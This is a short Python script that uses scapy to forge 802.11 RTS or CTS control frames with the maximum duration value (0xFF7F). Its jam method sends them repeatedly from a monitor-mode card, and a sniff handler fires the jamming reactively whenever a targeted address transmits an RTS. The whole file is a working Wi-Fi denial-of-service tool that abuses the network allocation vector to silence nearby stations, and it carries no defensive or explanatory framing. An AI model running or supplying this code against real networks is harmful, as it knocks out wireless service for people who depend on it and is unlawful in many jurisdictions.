import sys, os, subprocess
from subprocess import PIPE
from scapy.all import *

class RTS_CTS_NAV():

    def __init__(self, address, card_mac, monitor_card, subtype, packets, inter):
        self.address = address
        self.monitor_card = monitor_card
        self. card_mac = card_mac
        self.packets = packets
        self.subtype = subtype
        self.inter = inter
        self.packet = ""

    def create_packet(self):
        if self.subtype == 'cts':
            self.packet = self.cts_packet()
        else:
            self.packet = self.rts_packet()

    def cts_packet(self):
        pkt = RadioTap()/Dot11FCS(type=1, subtype=12, addr1=self.address, ID=0xFF7F)
        return pkt

    def rts_packet(self):
        return RadioTap()/Dot11FCS(type=1, subtype=11, addr1=self.address, addr2=self.card_mac, ID=0xFF7F)

    def jam(self):
        conf.verb = 0
        try:
            sendp(self.packet, iface = self.monitor_card, count=self.packets, inter=self.inter)
        except KeyboardInterrupt:
            pass

    def PacketHandler(self, pkt) :
        conf.verb=0
        try:
            if pkt.haslayer(Dot11FCS) and pkt.type == 1 and pkt.subtype == 11 and pkt.addr2 == self.address:
                self.jam()
        except KeyboardInterrupt:
            pass

    def sniff(self):
        sniff(iface=self.monitor_card, prn=self.PacketHandler)
